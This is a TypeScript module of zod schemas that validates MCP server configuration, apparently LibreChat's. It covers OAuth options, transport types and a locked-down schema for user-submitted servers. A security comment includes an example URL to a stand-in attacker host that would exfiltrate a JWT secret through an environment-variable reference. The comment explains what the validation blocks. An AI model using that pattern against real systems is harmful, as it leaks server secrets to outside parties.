import { z } from 'zod';
import { TokenExchangeMethodEnum } from './types/agents';
import { extractEnvVariable } from './utils';

/**
 * Upper bound on a stored MCP `iconPath` (URL or data URI). Enforced by
 * `sanitizeMcpIconPath`, not a schema `.max()`, so re-submitting a server whose
 * stored icon predates the cap clears the icon instead of rejecting the update.
 */
export const MAX_MCP_ICON_PATH_LENGTH = 256 * 1024;

/** Keep persistence admission waits below the shared lease's 15-minute lifetime. */
export const MAX_MCP_OAUTH_PERSISTENCE_WAIT_MS = 14 * 60_000;

const validateOAuthClientCredentials = (
  oauth: {
    client_id?: string;
    client_secret?: string;
    authorization_url?: string;
    token_url?: string;
  },
  ctx: z.RefinementCtx,
): void => {
  if (oauth.client_secret && !oauth.client_id) {
    ctx.addIssue({
      code: z.ZodIssueCode.custom,
      path: ['client_secret'],
      message: 'OAuth client_secret requires client_id',
    });
  }

  if (oauth.client_id && oauth.client_secret && (!oauth.authorization_url || !oauth.token_url)) {
    ctx.addIssue({
      code: z.ZodIssueCode.custom,
      path: ['client_secret'],
      message: 'OAuth client_secret with client_id requires both authorization_url and token_url',
    });
  }
};

const OAuthOptionsBaseSchema = z.object({
  /** OAuth authorization endpoint (optional - can be auto-discovered) */
  authorization_url: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** OAuth token endpoint (optional - can be auto-discovered) */
  token_url: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** OAuth client ID (optional - can use dynamic registration) */
  client_id: z.string().optional(),
  /** OAuth client secret (requires explicit authorization and token endpoints) */
  client_secret: z.string().optional(),
  /** OAuth scopes to request */
  scope: z.string().optional(),
  /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
  redirect_uri: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** Token exchange method */
  token_exchange_method: z.nativeEnum(TokenExchangeMethodEnum).optional(),
  /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
  grant_types_supported: z.array(z.string()).optional(),
  /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
  token_endpoint_auth_methods_supported: z.array(z.string()).optional(),
  /** Supported response types (defaults to ['code']) */
  response_types_supported: z.array(z.string()).optional(),
  /** Supported code challenge methods (defaults to ['S256', 'plain']) */
  code_challenge_methods_supported: z.array(z.string()).optional(),
  /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
  skip_code_challenge_check: z.boolean().optional(),
  /**
   * Auth0/Cognito-style `audience` parameter. Authorization servers that pre-date
   * RFC 8707 — most prominently Auth0 — issue API-scoped access tokens only when
   * the `/authorize` request advertises an `audience`. RFC 8707 `resource` (set
   * automatically from Protected Resource Metadata) is the standards-conformant
   * route; `audience` covers the providers that ignore it.
   *
   * When set, the value is forwarded as-is on `/authorize` (both pre-configured
   * and DCR-discovered paths). Whether it is also forwarded on the
   * `refresh_token` grant is controlled by `forward_audience_on_refresh` below.
   *
   * The `authorization_code` exchange intentionally never receives `audience` —
   * Auth0 binds audience from the original `/authorize` request and embeds it
   * in the issued access token; sending it again is redundant.
   *
   * No canonicalization is applied — the audience identifier is provider-defined
   * and may differ from the MCP server URL. This field is only accepted from
   * trusted/admin MCP configuration and is rejected from user-managed servers.
   */
  audience: z.string().min(1).optional(),
  /**
   * Whether to also forward `audience` on the `refresh_token` grant body.
   *
   * Default: `true`. Required for Auth0, which strips the API audience from
   * refreshed access tokens unless `audience` is re-supplied on every refresh
   * — without it the next MCP call 401s once the initial access token expires.
   *
   * Set to `false` for providers that document refresh requests as
   * `grant_type` + `client_id` + `refresh_token` only (Cognito and other
   * strict OAuth 2.0 token endpoints). Those providers maintain the original
   * `aud` claim across refreshes when the initial token was resource-bound,
   * so the extra parameter is redundant and may be rejected as
   * `invalid_request`.
   *
   * Ignored when `audience` itself is not configured.
   */
  forward_audience_on_refresh: z.boolean().optional(),
  /**
   * Whether to send the RFC 8707 `resource` parameter on `/authorize`, the
   * `authorization_code` exchange and the `refresh_token` grant. The value is the
   * canonical resource identifier from the MCP server's Protected Resource Metadata
   * (RFC 9728), never an operator-supplied string.
   *
   * Default: `true`. RFC 8707 makes `resource` OPTIONAL, and authorization servers
   * that reject it cannot complete a flow that sends it: Microsoft Entra ID v2.0
   * fails an `/authorize` request carrying both `resource` and `scope` with
   * `AADSTS9010010`. Set to `false` for those providers, and rely on `scope` (or
   * `audience` above) to obtain an API-scoped token.
   *
   * Opting out suppresses the parameter only. Protected Resource Metadata is still
   * discovered, still validated against the MCP server URL (RFC 9728 §3.3), and
   * still recorded on the stored client binding, so scope discovery, authorization
   * server discovery and re-authentication checks are unaffected.
   *
   * This field is only accepted from trusted/admin MCP configuration and is rejected
   * from user-managed servers.
   */
  send_resource_parameter: z.boolean().optional(),
  /** OAuth revocation endpoint (optional - can be auto-discovered) */
  revocation_endpoint: z
    .string()
    .transform((val) => extractEnvVariable(val))
    .pipe(z.string().url())
    .optional(),
  /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
  revocation_endpoint_auth_methods_supported: z.array(z.string()).optional(),
});

const OAuthOptionsSchema = OAuthOptionsBaseSchema.superRefine(validateOAuthClientCredentials);

const BLOCKED_USER_OAUTH_ENDPOINT_PARAMS = ['audience', 'resource'] as const;
const envVarPattern = /\$\{[^}]+\}/;

const userOAuthEndpointUrlSchema = z
  .string()
  .refine((val) => !envVarPattern.test(val), {
    message: 'Environment variable references are not allowed in URLs',
  })
  .pipe(z.string().url())
  .refine(
    (value) => {
      try {
        const { searchParams } = new URL(value);
        return BLOCKED_USER_OAUTH_ENDPOINT_PARAMS.every((param) => !searchParams.has(param));
      } catch {
        return true;
      }
    },
    { message: 'OAuth endpoint URLs cannot include audience or resource query parameters' },
  );

const UserOAuthOptionsSchema = OAuthOptionsBaseSchema.omit({
  audience: true,
  forward_audience_on_refresh: true,
  send_resource_parameter: true,
})
  .extend({
    authorization_url: userOAuthEndpointUrlSchema.optional(),
    token_url: userOAuthEndpointUrlSchema.optional(),
    redirect_uri: userOAuthEndpointUrlSchema.optional(),
    revocation_endpoint: userOAuthEndpointUrlSchema.optional(),
    audience: z.never().optional(),
    forward_audience_on_refresh: z.never().optional(),
    send_resource_parameter: z.never().optional(),
  })
  .superRefine(validateOAuthClientCredentials);

const OboOptionsSchema = z.object({
  /** Scopes to request for the downstream MCP server (e.g., "api://<client-id>/Mcp.Tools.ReadWrite") */
  scopes: z.string().min(1),
});

export const MCP_SERVER_TITLE_PATTERN = new RegExp(
  "^[\\p{L}\\p{N}][\\p{L}\\p{N}\\p{M}'’ -]*$",
  'u',
);
export const MCP_SERVER_TITLE_ERROR =
  'Title must start with a letter or number and can include spaces, hyphens, and apostrophes';

const BaseOptionsSchema = z.object({
  /** Display name for the MCP server */
  title: z.string().regex(MCP_SERVER_TITLE_PATTERN, MCP_SERVER_TITLE_ERROR).optional(),
  /** Description of the MCP server */
  description: z.string().optional(),
  /**
   * Controls whether the MCP server is initialized during application startup.
   * - true (default): Server is initialized during app startup and included in app-level connections
   * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
   *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
   */
  startup: z.boolean().optional(),
  iconPath: z.string().optional(),
  timeout: z.number().int().nonnegative().optional(),
  /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
  sseReadTimeout: z.number().int().positive().optional(),
  initTimeout: z.number().int().nonnegative().optional(),
  /**
   * How long (ms) a replica waits for another replica's in-flight OAuth refresh-token redemption
   * before failing the attempt as retryable. Raise it for a slow token endpoint; lower it to fail
   * faster. Default when unset: 15_000. Clamped to 30_000, half the window after which a
   * redemption aborts itself, because this wait runs inside the redemption that window governs.
   *
   * Positive rather than non-negative: zero would mean "never wait for a peer", which fails every
   * contended refresh instead of adopting the rotation a peer is about to store, and that is the
   * common case this wait exists to serve. Omit the field to take the default.
   */
  oauthRefreshWaitTimeout: z.number().int().positive().optional(),
  /** Enable only after every replica has upgraded to the coordinated OAuth writer protocol. Default: false. */
  oauthRefreshCoordination: z.boolean().optional(),
  /** Wait (ms) for callback/adoption persistence and publication. Default: 15_000; maximum: 840_000. */
  oauthPersistenceWaitTimeout: z
    .number()
    .int()
    .positive()
    .max(MAX_MCP_OAUTH_PERSISTENCE_WAIT_MS)
    .optional(),
  /**
   * Whether the server is offered in chat.
   *
   * `false` hides it from the chat dropdown (MCPSelect) AND bars it from the
   * chat selection a request carries, so a stale or hand-written request cannot
   * reach it either. It does not restrict agents, nor a server a model spec
   * pins through `mcpServers` — both are the operator's own choice.
   */
  chatMenu: z.boolean().optional(),
  /**
   * Controls server instruction behavior:
   * - undefined/not set: No instructions included (default)
   * - true: Use server-provided instructions
   * - string: Use custom instructions (overrides server-provided)
   */
  serverInstructions: z.union([z.boolean(), z.string()]).optional(),
  /**
   * When true, every tool from this MCP server defaults to deferred loading:
   * the model receives the `tool_search` tool plus a name-only listing instead
   * of each tool's full schema. Sets the default for each tool's `defer_loading`;
   * a per-agent `tool_options[toolId].defer_loading` (true OR false) overrides it.
   * Requires the `deferred_tools` agent capability to be enabled.
   */
  deferLoading: z.boolean().optional(),
  /**
   * Whether this server requires OAuth authentication
   * If not specified, will be auto-detected during construction
   */
  requiresOAuth: z.boolean().optional(),
  /**
   * OAuth configuration for SSE and Streamable HTTP transports
   * - Optional: OAuth can be auto-discovered on 401 responses
   * - Pre-configured confidential clients must pin both OAuth endpoints
   */
  oauth: OAuthOptionsSchema.optional(),
  /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
  oauth_headers: z.record(z.string(), z.string()).optional(),
  /**
   * API Key authentication configuration for SSE and Streamable HTTP transports
   * - source: 'admin' means the key is provided by admin and shared by all users
   * - source: 'user' means each user provides their own key via customUserVars
   */
  apiKey: z
    .object({
      /** API key value (only for admin-provided mode, stored encrypted) */
      key: z.string().optional(),
      /** Whether key is provided by admin or each user */
      source: z.enum(['admin', 'user']),
      /** How to format the authorization header */
      authorization_type: z.enum(['basic', 'bearer', 'custom']),
      /** Custom header name when authorization_type is 'custom' */
      custom_header: z.string().optional(),
    })
    .optional(),
  customUserVars: z
    .record(
      z.string(),
      z.object({
        title: z.string(),
        description: z.string(),
        /**
         * Whether the field holds a secret and should be masked in the UI.
         * Defaults to masked when omitted; set to `false` for non-secret setup
         * values (e.g. username, project key, base URL) to render as plain text.
         */
        sensitive: z.boolean().optional(),
      }),
    )
    .optional(),
});

const ProxyUrlSchema = z
  .string()
  .transform((val: string) => extractEnvVariable(val))
  .pipe(z.string().url())
  .refine(
    (val: string) => {
      const protocol = new URL(val).protocol;
      return (
        protocol === 'http:' ||
        protocol === 'https:' ||
        protocol === 'socks:' ||
        protocol === 'socks5:'
      );
    },
    {
      message: 'Proxy URL must use http://, https://, socks://, or socks5://',
    },
  );

const PROCESS_MCP_SERVER_FIELDS = new Set(['command', 'args', 'env', 'cwd', 'stderr']);

export function isProcessMCPServerField(field: string): boolean {
  return PROCESS_MCP_SERVER_FIELDS.has(field);
}

export function isProcessMCPServerConfig(value: unknown): boolean {
  if (value == null || typeof value !== 'object' || Array.isArray(value)) {
    return false;
  }

  const config = value as Record<string, unknown>;
  if (config.type === 'stdio') {
    return true;
  }

  return Object.keys(config).some(isProcessMCPServerField);
}

export function hasProcessMCPServerConfig(value: unknown): boolean {
  if (value == null || typeof value !== 'object' || Array.isArray(value)) {
    return false;
  }

  return Object.values(value).some(isProcessMCPServerConfig);
}

export const StdioOptionsSchema = BaseOptionsSchema.extend({
  type: z.literal('stdio').default('stdio'),
  obo: z.undefined().optional(),
  /**
   * The executable to run to start the server.
   */
  command: z.string(),
  /**
   * Command line arguments to pass to the executable.
   */
  args: z.array(z.string()),
  /**
   * The environment to use when spawning the process.
   *
   * If not specified, the result of getDefaultEnvironment() will be used.
   * Environment variables can be referenced using ${VAR_NAME} syntax.
   */
  env: z
    .record(z.string(), z.string())
    .optional()
    .transform((env) => {
      if (!env) {
        return env;
      }

      const processedEnv: Record<string, string> = {};
      for (const [key, value] of Object.entries(env)) {
        processedEnv[key] = extractEnvVariable(value);
      }
      return processedEnv;
    }),
  /**
   * How to handle stderr of the child process.
   * Accepts: 'pipe' | 'ignore' | 'inherit' | file descriptor number.
   * Defaults to "inherit".
   */
  stderr: z
    .union([z.enum(['pipe', 'ignore', 'inherit']), z.number().int().nonnegative()])
    .optional(),
  /**
   * Working directory for the spawned process. Supplied by Agent Plugins
   * packages, which resolve and contain the path before it reaches this schema.
   */
  cwd: z.string().optional(),
});

export const WebSocketOptionsSchema = BaseOptionsSchema.extend({
  type: z.literal('websocket').default('websocket'),
  obo: z.undefined().optional(),
  url: z
    .string()
    .transform((val: string) => extractEnvVariable(val))
    .pipe(z.string().url())
    .refine(
      (val: string) => {
        const protocol = new URL(val).protocol;
        return protocol === 'ws:' || protocol === 'wss:';
      },
      {
        message: 'WebSocket URL must start with ws:// or wss://',
      },
    ),
});

export const SSEOptionsSchema = BaseOptionsSchema.extend({
  type: z.literal('sse').default('sse'),
  headers: z.record(z.string(), z.string()).optional(),
  /**
   * Headers resolved from the live chat request and merged over `headers`.
   * Omitted during catalog discovery, which has no request context, so a
   * `{{LIBRECHAT_BODY_*}}` placeholder here does not block tool listing.
   * On a duplicate header name the resolved `requestHeaders` value wins.
   */
  requestHeaders: z.record(z.string(), z.string()).optional(),
  /**
   * On-Behalf-Of (OBO) token exchange configuration.
   * When configured, LibreChat exchanges the logged-in user's federated access token
   * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
   * The exchanged token is injected as a Bearer Authorization header automatically.
   * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
   */
  obo: OboOptionsSchema.optional(),
  /** Optional outbound proxy URL for this remote MCP transport */
  proxy: ProxyUrlSchema.optional(),
  url: z
    .string()
    .transform((val: string) => extractEnvVariable(val))
    .pipe(z.string().url())
    .refine(
      (val: string) => {
        const protocol = new URL(val).protocol;
        return protocol !== 'ws:' && protocol !== 'wss:';
      },
      {
        message: 'SSE URL must not start with ws:// or wss://',
      },
    ),
});

export const StreamableHTTPOptionsSchema = BaseOptionsSchema.extend({
  type: z.union([z.literal('streamable-http'), z.literal('http')]),
  headers: z.record(z.string(), z.string()).optional(),
  /**
   * Headers resolved from the live chat request and merged over `headers`.
   * Omitted during catalog discovery, which has no request context, so a
   * `{{LIBRECHAT_BODY_*}}` placeholder here does not block tool listing.
   * On a duplicate header name the resolved `requestHeaders` value wins.
   */
  requestHeaders: z.record(z.string(), z.string()).optional(),
  /**
   * On-Behalf-Of (OBO) token exchange configuration.
   * When configured, LibreChat exchanges the logged-in user's federated access token
   * for a token scoped to this MCP server via the OAuth 2.0 OBO flow (jwt-bearer grant).
   * The exchanged token is injected as a Bearer Authorization header automatically.
   * Requires the user to be authenticated via OpenID Connect (e.g., Entra ID).
   */
  obo: OboOptionsSchema.optional(),
  /** Optional outbound proxy URL for this remote MCP transport */
  proxy: ProxyUrlSchema.optional(),
  url: z
    .string()
    .transform((val: string) => extractEnvVariable(val))
    .pipe(z.string().url())
    .refine(
      (val: string) => {
        const protocol = new URL(val).protocol;
        return protocol !== 'ws:' && protocol !== 'wss:';
      },
      {
        message: 'Streamable HTTP URL must not start with ws:// or wss://',
      },
    ),
});

export const MCPOptionsSchema = z.union([
  StdioOptionsSchema,
  WebSocketOptionsSchema,
  SSEOptionsSchema,
  StreamableHTTPOptionsSchema,
]);

export const MCPServersSchema = z.record(z.string(), MCPOptionsSchema);

export type MCPOptions = z.infer<typeof MCPOptionsSchema>;

/**
 * Helper to omit server-managed fields that should not come from UI
 */
const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T) =>
  schema.omit({
    startup: true,
    timeout: true,
    sseReadTimeout: true,
    initTimeout: true,
    oauthRefreshWaitTimeout: true,
    oauthRefreshCoordination: true,
    oauthPersistenceWaitTimeout: true,
    chatMenu: true,
    serverInstructions: true,
    requiresOAuth: true,
    customUserVars: true,
    oauth_headers: true,
  });

const userManagedServerFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T) =>
  omitServerManagedFields(schema).extend({
    oauth: UserOAuthOptionsSchema.optional(),
  });

const isWsProtocol = (val: string): boolean => /^wss?:/i.test(val);
const isHttpProtocol = (val: string): boolean => /^https?:/i.test(val);

/**
 * Builds a URL schema for user input that rejects ${VAR} env variable patterns
 * and validates protocol constraints without resolving environment variables.
 */
const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string) =>
  z
    .string()
    .refine((val) => !envVarPattern.test(val), {
      message: 'Environment variable references are not allowed in URLs',
    })
    .pipe(z.string().url())
    .refine(protocolCheck, { message });

/**
 * MCP Server configuration that comes from UI/API input only.
 * Omits server-managed fields like startup, timeout, customUserVars, etc.
 * Allows: title, description, url, iconPath, oauth (user credentials).
 * Admin-only OAuth audience fields are rejected for user-managed servers.
 *
 * SECURITY: Stdio transport is intentionally excluded from user input.
 * Stdio allows arbitrary command execution and should only be configured
 * by administrators via the YAML config file (librechat.yaml).
 * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
 *
 * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
 * extractEnvVariable transform to prevent env variable exfiltration
 * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
 * Protocol checks use positive allowlists (http(s) / ws(s)) to block
 * file://, ftp://, javascript:, and other non-network schemes.
 */
export const MCPServerUserInputSchema = z.union([
  userManagedServerFields(WebSocketOptionsSchema).extend({
    url: userUrlSchema(isWsProtocol, 'WebSocket URL must use ws:// or wss://'),
  }),
  userManagedServerFields(SSEOptionsSchema).extend({
    proxy: z.never().optional(),
    url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
  }),
  userManagedServerFields(StreamableHTTPOptionsSchema).extend({
    proxy: z.never().optional(),
    url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
  }),
]);

export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;

/**
 * Set of every field name that may appear in a user-submitted MCP server config,
 * derived from `MCPServerUserInputSchema`'s union members. Used as the comparison
 * surface for the OBO lockdown check in `updateMCPServerController` so that
 * server-managed fields on the existing config (`dbId`, `source`, `author`,
 * `requiresOAuth`, `oauthMetadata`, etc.) don't show up as differences and
 * cause spurious 403s on legitimate saves.
 *
 * Schema-derived rather than hand-maintained: when a new field is added to
 * `BaseOptionsSchema` or any transport variant, it flows into this set
 * automatically. The OBO lockdown then locks the new field by default
 * (since it won't be in the hand-curated `OBO_USER_EDITABLE_FIELDS`
 * allowlist), preventing a silent privilege regression.
 */
export const MCP_USER_INPUT_FIELDS: ReadonlySet<string> = (() => {
  const fields = new Set<string>();
  for (const variant of MCPServerUserInputSchema.options) {
    const shape = (variant as unknown as { shape: Record<string, unknown> }).shape;
    for (const key of Object.keys(shape)) {
      fields.add(key);
    }
  }
  return fields;
})();
